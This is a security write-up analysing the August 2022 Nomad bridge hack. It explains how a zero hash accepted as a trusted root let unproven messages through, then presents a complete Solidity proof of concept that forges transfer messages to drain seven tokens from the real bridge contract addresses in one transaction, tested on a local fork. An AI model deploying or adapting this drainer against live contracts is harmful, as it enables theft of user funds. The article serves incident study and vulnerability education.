# OnChain Transaction Debugging: 7. Hack Analysis: Nomad Bridge (2022/08)

### Author: [gmhacker.eth](https://twitter.com/realgmhacker)

## Introduction
The Nomad bridge was hacked on August 1st, 2022, and $190m of locked funds were drained. After one attacker first managed to exploit the vulnerability and struck gold, other dark forest travelers jumped to replay the exploit in what eventually became a colossal, “crowdsourced” hack.

A routine upgrade on the implementation of one of Nomad’s proxy contracts marked a zero hash value as a trusted root, which allowed messages to get automatically proved. The hacker leveraged this vulnerability to spoof the bridge contract and trick it to unlock funds.

That first successful transaction alone, which can be seen [here](https://dashboard.tenderly.co/tx/mainnet/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460), drained 100 WBTC from the bridge–around $2.3m at the time. There was no need for a flashloan or other complex interaction with another DeFi protocol. The attack simply called a function on the contract with the right message input, and the attacker continued throwing blows at the protocol’s liquidity.

Unfortunately, the simple and replayable nature of the transaction led others to collect some of the illicit profit. As [Rekt News](https://rekt.news/nomad-rekt/) put it, “Staying true to DeFi Principles, this hack was permissionless — anyone could join in.”

In this article, we will be analyzing the exploited vulnerability in the Nomad bridge’s Replica contract, and then we’ll create our own version of the attack to drain all the liquidity in one transaction, testing it against a local fork. You can check the full PoC [here](https://github.com/immunefi-team/hack-analysis-pocs/tree/main/src/nomad-august-2022).

This article was written by [gmhacker.eth](https://twitter.com/realgmhacker), an Immunefi Smart Contract Triager.

## Background

Nomad is a cross-chain communication protocol allowing, among other things, bridging of tokens between Ethereum, Moonbeam and other chains. Messages sent to Nomad contracts are verified and transported to other chains through off-chain agents, following an optimistic verification mechanism.

Like most cross-chain bridging protocols, Nomad’s token bridge is able to transfer value through different chains by a process of locking tokens on one side and minting representatives on the other. Because those representative tokens can eventually be burned to unlock the original funds (i.e. bridging back to the token’s native chain), they function as IOUs and have the same economic value as the original ERC-20s. That aspect of bridges in general leads to a big accumulation of funds inside a complex smart contract, rendering it a much-desired target for hackers.

<div align=center>
<img src="https://user-images.githubusercontent.com/107821372/217752487-9580592c-98ed-4690-b330-d211d795d276.png" alt="Cover" width="80%"/>
</div>

Locking & minting process, src: [MakerDAO’s blog](https://blog.makerdao.com/what-are-blockchain-bridges-and-why-are-they-important-for-defi/)

In Nomad’s case, a contract called `Replica`, which is deployed on all supported chains, is responsible for validating messages in a Merkle tree structure. Other contracts in the protocol rely on this for authentication of inbound messages. Once a message is validated, it is stored in the Merkle tree, generating a new committed tree root which gets confirmed to be processed.

## Root Cause

Having a rough understanding of what the Nomad bridge is, we can dive into the actual smart contract code to explore the root cause vulnerability that was leveraged in the various transactions of the August 2022 hack. To do that, we need to go deeper into the `Replica` contract.

```
   function process(bytes memory _message) public returns (bool _success) {
       // ensure message was meant for this domain
       bytes29 _m = _message.ref(0);
       require(_m.destination() == localDomain, "!destination");
       // ensure message has been proven
       bytes32 _messageHash = _m.keccak();
       require(acceptableRoot(messages[_messageHash]), "!proven");
       // check re-entrancy guard
       require(entered == 1, "!reentrant");
       entered = 0;
       // update message status as processed
       messages[_messageHash] = LEGACY_STATUS_PROCESSED;
       // call handle function
       IMessageRecipient(_m.recipientAddress()).handle(
           _m.origin(),
           _m.nonce(),
           _m.sender(),
           _m.body().clone()
       );
       // emit process results
       emit Process(_messageHash, true, "");
       // reset re-entrancy guard
       entered = 1;
       // return true
       return true;
   }
```
<div align=center>

Snippet 1: `process` function on Replica.sol, view [raw](https://gist.github.com/gists-immunefi/f8ef00be9e1c5dd4d879a418966191e0#file-nomad-hack-analysis-1-sol).

</div>

The `process` [function](https://etherscan.io/address/0xb92336759618f55bd0f8313bd843604592e27bd8#code%23F1%23L179) in the `Replica` contract is responsible for dispatching a message to its final recipient. This will only be successful if the input message has already been proven, which means that the message has already been added to the Merkle tree, leading to an accepted and trustworthy root. That check is done against the message hash, using the `acceptableRoot` view function, which will read from the confirmed roots mapping.

```
   function initialize(
       uint32 _remoteDomain,
       address _updater,
       bytes32 _committedRoot,
       uint256 _optimisticSeconds
   ) public initializer {
       __NomadBase_initialize(_updater);
       // set storage variables
       entered = 1;
       remoteDomain = _remoteDomain;
       committedRoot = _committedRoot;
       // pre-approve the committed root.
       confirmAt[_committedRoot] = 1;
       _setOptimisticTimeout(_optimisticSeconds);
   }
```
<div align=center>

Snippet 2: `initialize` function in Replica.sol, view [raw](https://gist.github.com/gists-immunefi/4792c4bb10d3f73648b4b0f86e564ac9#file-nomad-hack-analysis-2-sol).

</div>

When an upgrade happens on the implementation of a given proxy contract, the upgrading logic may execute a one-time-call initialization function. This function will set some initial state values. In particular, a routine [April 21st upgrade](https://openchain.xyz/trace/ethereum/0x99662dacfb4b963479b159fc43c2b4d048562104fe154a4d0c2519ada72e50bf) was made, and the value 0x00 was passed as the pre-approved committed root, which gets stored into the confirmAt mapping. This is where the vulnerability appeared.

Going back to the `process()` function, we see that we rely on checking for a message hash on the `messages` mapping. That mapping is responsible for marking messages as processed, so that attackers cannot replay the same message.

A particular aspect of an EVM smart contract storage is that all slots are virtually initialized as zero values, which means that if one reads an unused slot in storage, it won’t raise an exception but rather it will return 0x00. A corollary to this is that every unused key on a Solidity mapping will return 0x00. Following that logic, whenever the message hash is not present on the `messages` mapping, 0x00 will be returned, and that will be passed to the `acceptableRoot` function, which in turn will return true given that 0x00 has been set as a trusted root. The message will then be marked as processed, but anybody can simply change the message to create a new unused one and resubmit it.

The input message encodes various different parameters in a given format. Among those, for a message to unlock funds from the bridge, there’s the recipient address. So after the first attacker executed a [successful transaction](https://dashboard.tenderly.co/tx/mainnet/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460), anyone that knew how to decode the message format could simply change the recipient address and replay the attack transaction, this time with a different message that would give profit to the new address.

## Proof of Concept

Now that we understand the vulnerability that compromised the Nomad protocol, we can formulate our own proof of concept (PoC). We will craft specific messages to call the `process` function in `Replica` function once for each specific token we want to drain, leading to protocol insolvency in just one single transaction.

We’ll start by selecting an RPC provider with archive access. For this demonstration, we will be using [the free public RPC aggregator](https://www.ankr.com/rpc/eth/) provided by Ankr. We select the block number 15259100 as our fork block, 1 block before the first hack transaction.

Our PoC needs to run through a number of steps on a single transaction to be successful. Here is a high-level overview of what we will be implementing in our attack PoC:

1. Select a given ERC-20 token and check the balance of the Nomad ERC-20 bridge contract.
2. Generate a message payload with the right parameters to unlock funds, among which our attacker address as the recipient and the full token balance as the amount of funds to be unlocked.
3. Call the vulnerable process function, which will lead to a transfer of tokens to the recipient address.
4. Loop through various ERC-20 tokens with a relevant presence on the bridge’s balance to drain those funds in the same fashion.

Let’s code one step at a time, and eventually look at how the entire PoC looks. We will be using Foundry.

## The Attack

```
pragma solidity ^0.8.13;
 
import "@openzeppelin/token/ERC20/ERC20.sol";
 
interface IReplica {
   function process(bytes memory _message) external returns (bool _success);
}
 
contract Attacker {
   address constant REPLICA = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
   address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;
 
   // tokens
   address [] public tokens = [
       0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
       0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
       0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
       0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
       0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
       0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0, // FRAX
       0xD417144312DbF50465b1C641d016962017Ef6240  // CQT
   ];
 
   function attack() external {
       for (uint i = 0; i < tokens.length; i++) {
           address token = tokens[i];
           uint256 amount_bridge = IERC20(token).balanceOf(ERC20_BRIDGE);
 
           bytes memory payload = genPayload(msg.sender, token, amount_bridge);
           bool success = IReplica(REPLICA).process(payload);
           require(success, "Failed to process the payload");
       }
   }
 
   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory) {}
}
```
<div align=center>

Snippet 3: The start of our attack contract, view [raw](https://gist.github.com/gists-immunefi/4305df38623ddcaa11812a9c186c73ac#file-nomad-hack-analysis-3-sol).

</div>

Let’s begin by creating our Attacker contract. The entry point to our contract will be the `attack` function, which is as simple as a for loop going through various different token addresses. We check `ERC20_BRIDGE`’s balance of the specific token that we’re dealing with. This is the address of the Nomad ERC-20 bridge contract, which holds the locked funds on Ethereum.

After that, the malicious message payload is generated. The parameters that will change in each loop iteration are the token address and the amount of funds to be transferred. The generated message will be the input to the `IReplica.process` function. As we already established, this function will forward the encoded message to the right end contract on the Nomad protocol to bring the unlock and transferring request to fruition, effectively tricking the bridge logic.

```

contract Attacker {
   address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
  
   // Nomad domain IDs
   uint32 constant ETHEREUM = 0x657468;   // "eth"
   uint32 constant MOONBEAM = 0x6265616d; // "beam"
 
   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory payload) {
       payload = abi.encodePacked(
           MOONBEAM,                           // Home chain domain
           uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
           uint32(0),                          // Dst nonce
           ETHEREUM,                           // Dst chain domain
           uint256(uint160(ERC20_BRIDGE)),     // Recipient (Nomad ERC20 bridge)
           ETHEREUM,                           // Token domain
           uint256(uint160(token)),            // token id (e.g. WBTC)
           uint8(0x3),                         // Type - transfer
           uint256(uint160(recipient)),        // Recipient of the transfer
           uint256(amount),                    // Amount
           uint256(0)                          // Optional: Token details hash
                                               // keccak256(                 
                                               //     abi.encodePacked(
                                               //         bytes(tokenName).length,
                                               //         tokenName,
                                               //         bytes(tokenSymbol).length,
                                               //         tokenSymbol,
                                               //         tokenDecimals
                                               //     )
                                               // )
       );
   }
}
```
<div align=center>

Snippet 4: Generate the malicious message with the right format and parameters, view [raw](https://gist.github.com/gists-immunefi/2a5fbe2e6034dd30534bdd4433b52a29#file-nomad-hack-analysis-4-sol).

</div>

The generated message needs to be encoded with various different parameters, so that it gets properly unpacked by the protocol. Importantly, we need to specify the forwarding path of the message — the bridge router and the ERC-20 bridge addresses. We must flag the message as a token transfer, hence the `0x3` value as the type.

Finally, we have to specify the parameters that will bring the profit to us–the right token address, the amount to be transferred, and the recipient of that transfer. As we’ve seen already, this will surely create a brand new original message that will never have been processed by the `Replica` contract, which means that it will actually be seen as valid, according to our previous explanation.

Quite impressively, this completes the entire exploit logic. If we had some Foundry logs, our PoC still amounts to only 87 lines of code.

If we run this PoC against the forked block number, we will get the following profits:

* 1,028 WBTC
* 22,876 WETH
* 87,459,362 USDC
* 8,625,217 USDT
* 4,533,633 DAI
* 119,088 FXS
113,403,733 CQT

## Conclusion

The Nomad Bridge exploit was one of the biggest hacks of 2022. The attack stresses the importance of security throughout the entire protocol. In this particular case, we’ve learned how a single routine upgrade on a proxy implementation can cause a critical vulnerability and compromise all locked funds. Furthermore, during development one needs to be careful regarding the 0x00 default values on storage slots, specially in logic involving mappings. It’s also good to have some unit testing setup for such common values that might lead to vulnerabilities.

It should be noted that some scavenger accounts that drained portions of the funds returned them to the protocol. There are [plans to relaunch the bridge](https://medium.com/nomad-xyz-blog/nomad-bridge-relaunch-guide-3a4ef6624f90), and the returned assets will be distributed to users through pro-rata shares of those recovered funds. Any stolen funds can be returned to Nomad’s [recovery wallet](https://etherscan.io/address/0x94a84433101a10aeda762968f6995c574d1bf154).

As previously pointed out, this PoC actually enhances the hack and drains all TVL in one transaction. It is a simpler attack than what actually took place in reality. This is what our entire PoC looks like, with the addition of some helpful Foundry logs:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
 
import "@openzeppelin/token/ERC20/ERC20.sol";
import "forge-std/console.sol";
 
interface IReplica {
   function process(bytes memory _message) external returns (bool _success);
}
 
contract Attacker {
   address constant REPLICA = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
   address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
   address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;
  
   // Nomad domain IDs
   uint32 constant ETHEREUM = 0x657468;   // "eth"
   uint32 constant MOONBEAM = 0x6265616d; // "beam"
 
   // tokens
   address [] public tokens = [
       0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
       0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
       0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
       0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
       0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
       0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0, // FRAX
       0xD417144312DbF50465b1C641d016962017Ef6240  // CQT
   ];
 
   function attack() external {
       for (uint i = 0; i < tokens.length; i++) {
           address token = tokens[i];
           uint256 amount_bridge = ERC20(token).balanceOf(ERC20_BRIDGE);
 
           console.log(
               "[*] Stealing",
               amount_bridge / 10**ERC20(token).decimals(),
               ERC20(token).symbol()
           );
           console.log(
               "    Attacker balance before:",
               ERC20(token).balanceOf(msg.sender)
           );
 
           // Generate the payload with all of the tokens stored on the bridge
           bytes memory payload = genPayload(msg.sender, token, amount_bridge);
 
           bool success = IReplica(REPLICA).process(payload);
           require(success, "Failed to process the payload");
 
           console.log(
               "    Attacker balance after: ",
               IERC20(token).balanceOf(msg.sender) / 10**ERC20(token).decimals()
           );
       }
   }
 
   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory payload) {
       payload = abi.encodePacked(
           MOONBEAM,                           // Home chain domain
           uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
           uint32(0),                          // Dst nonce
           ETHEREUM,                           // Dst chain domain
           uint256(uint160(ERC20_BRIDGE)),     // Recipient (Nomad ERC20 bridge)
           ETHEREUM,                           // Token domain
           uint256(uint160(token)),          // token id (e.g. WBTC)
           uint8(0x3),                         // Type - transfer
           uint256(uint160(recipient)),      // Recipient of the transfer
           uint256(amount),                  // Amount
           uint256(0)                          // Optional: Token details hash
                                               // keccak256(                 
                                               //     abi.encodePacked(
                                               //         bytes(tokenName).length,
                                               //         tokenName,
                                               //         bytes(tokenSymbol).length,
                                               //         tokenSymbol,
                                               //         tokenDecimals
                                               //     )
                                               // )
       );
   }
}
```
<div align=center>

Snippet 5: all code, view [raw](https://gist.github.com/gists-immunefi/2bdffe6f9683c9b3ab810e1fb7fe4aff#file-nomad-hack-analysis-5-sol).

</div>
